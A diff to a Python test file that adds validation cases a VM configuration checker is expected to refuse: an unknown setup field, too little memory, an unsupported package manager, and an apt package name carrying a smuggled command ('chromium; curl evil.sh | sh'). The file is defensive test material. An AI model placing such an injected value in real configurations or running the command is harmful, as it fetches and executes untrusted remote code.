@@ -295,4 +295,24 @@ REFUSALS: list[tuple[str, dict[str, Any], str]] = [
         ),
         "permissions/tools/0/annotations",
     ),
+    (
+        "a VM package that is a shell line",
+        with_(vm={"packages": {"apt": ["chromium; curl evil.sh | sh"]}}),
+        "vm/packages/apt/0",
+    ),
+    (
+        "a VM field spelled as the server's",
+        with_(vm={"setup_script": "true"}),
+        "vm",
+    ),
+    (
+        "a VM with less than the smallest memory",
+        with_(vm={"memoryMib": 64}),
+        "vm/memoryMib",
+    ),
+    (
+        "a VM package manager igni does not build with",
+        with_(vm={"packages": {"brew": ["chromium"]}}),
+        "vm/packages",
+    ),
 ]
